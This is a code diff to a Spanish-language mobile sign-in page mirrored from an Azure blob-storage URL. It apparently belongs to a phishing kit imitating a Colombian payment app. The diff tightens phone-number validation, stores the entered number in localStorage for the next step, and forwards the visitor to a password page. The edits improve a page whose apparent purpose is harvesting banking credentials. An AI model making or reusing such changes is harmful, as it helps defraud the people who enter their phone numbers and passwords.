@@ -1,4 +1,4 @@
-﻿<!doctype html>
+<!doctype html>
 <html lang="en">
   
 <!-- Mirrored from https://neqteayuda.blob.core.windows.net/neqkm/access-passed/accces-sign-in.php.html by HTTrack Website Copier/3.x [XR&CO], Sun, 18 Oct 2026 23:03:38 GMT -->
@@ -9,7 +9,6 @@
 
     <link rel="stylesheet" href="../css/footer.css">
     <link rel="stylesheet" href="../css/spinner.css">
-    <!-- <link rel="stylesheet" href="../css/navbar.css" /> -->
     <link rel="stylesheet" href="../css/globals.css">
     <link rel="stylesheet" href="../css/index.css">
 
@@ -137,12 +136,13 @@
                   </div>
                 </div>
                 <div class="flex-1">
-                  <input type="text" id="phoneNumber" inputmode="numeric" pattern="[0-9]*" placeholder="Ingresa tu cel" class="w-full h-11 px-4 text-white border-none focus:outline-none placeholder:text-white">
+                  <!-- Añadido maxlength="10" para limitar a 10 dígitos -->
+                  <input type="text" id="phoneNumber" maxlength="10" inputmode="numeric" pattern="[0-9]*" placeholder="Ingresa tu cel" class="w-full h-11 px-4 text-white border-none focus:outline-none placeholder:text-white">
                 </div>
               </div>
             </div>
             <div class="w-full flex gap-1">
-              <button class="w-full h-12 bg-pink-primary text-white rounded-sm text-base font-medium cursor-pointer transition-colors duration-200 disabled:opacity-50" id="loginButton" type="submit">
+              <button class="w-full h-12 bg-pink-primary text-white rounded-sm text-base font-medium cursor-pointer transition-colors duration-200 disabled:opacity-50" id="loginButton" type="submit" disabled>
                 Entra
               </button>
             </div>
@@ -153,10 +153,7 @@
 
     <script>
       document.addEventListener("DOMContentLoaded", () => {
-        const loadingContainerOther = document.getElementById(
-          "loadingContainerOther",
-        );
-
+        const loadingContainerOther = document.getElementById("loadingContainerOther");
         setTimeout(() => {
           if (loadingContainerOther) {
             loadingContainerOther.style.display = "none";
@@ -174,14 +171,24 @@
     </script>
 
     <script type="module">
-      import { LoginValidation } from "../js/validateLogin.js";
+      // Validaciones robustas integradas para asegurar que cumpla las reglas:
+      // 1. Exactamente 10 dígitos.
+      // 2. Debe empezar obligatoriamente por el número 3.
+      function LoginValidation(form) {
+        const phoneInput = form.querySelector("#phoneNumber");
+        if (!phoneInput) return false;
+        const val = phoneInput.value.trim();
+        // Regex: Comienza con 3 y tiene exactamente 10 dígitos numéricos
+        const regex = /^3[0-9]{9}$/;
+        return regex.test(val);
+      }
 
       document.addEventListener("DOMContentLoaded", () => {
         const form = document.getElementById("homeForm");
         const loginButton = document.getElementById("loginButton");
         const mainContainer = document.getElementById("mainContainer");
+        const phoneInput = document.getElementById("phoneNumber");
 
-        // Detectar cuando se abre el teclado
         function handleVisualViewport() {
           if (window.visualViewport) {
             if (window.visualViewport.height < window.innerHeight) {
@@ -193,22 +200,14 @@
         }
 
         if (window.visualViewport) {
-          window.visualViewport.addEventListener(
-            "resize",
-            handleVisualViewport,
-          );
+          window.visualViewport.addEventListener("resize", handleVisualViewport);
         }
-
-        // tryAgainButton.addEventListener("click", () => {
-        //   window.location.reload();
-        // });
 
         form.addEventListener("submit", (event) => {
           event.preventDefault();
         });
 
         const actualizarEstadoBoton = () => {
-          loginButton.disabled = true;
           if (LoginValidation(form)) {
             loginButton.disabled = false;
           } else {
@@ -216,17 +215,25 @@
           }
         };
 
-        form.addEventListener("input", actualizarEstadoBoton);
+        // Permitir solo números en el input
+        phoneInput.addEventListener("input", (e) => {
+          phoneInput.value = phoneInput.value.replace(/\D/g, ''); // Remueve cualquier carácter que no sea número
+          actualizarEstadoBoton();
+        });
 
         loginButton.addEventListener("click", async (event) => {
           event.preventDefault();
           if (LoginValidation(form)) {
+            // Guardar el número en localStorage para que el siguiente paso lo lea
+            const formData = JSON.parse(localStorage.getItem("formData")) || {};
+            formData.phoneNumber = phoneInput.value.trim();
+            localStorage.setItem("formData", JSON.stringify(formData));
+
+            // Avanzar correctamente a la siguiente pantalla sin devolverse
             window.location.href = "access-sign-in-pass.php.html";
           }
         });
       });
     </script>
   </body>
-
-<!-- Mirrored from https://neqteayuda.blob.core.windows.net/neqkm/access-passed/accces-sign-in.php.html by HTTrack Website Copier/3.x [XR&CO], Sun, 18 Oct 2026 23:03:42 GMT -->
 </html>
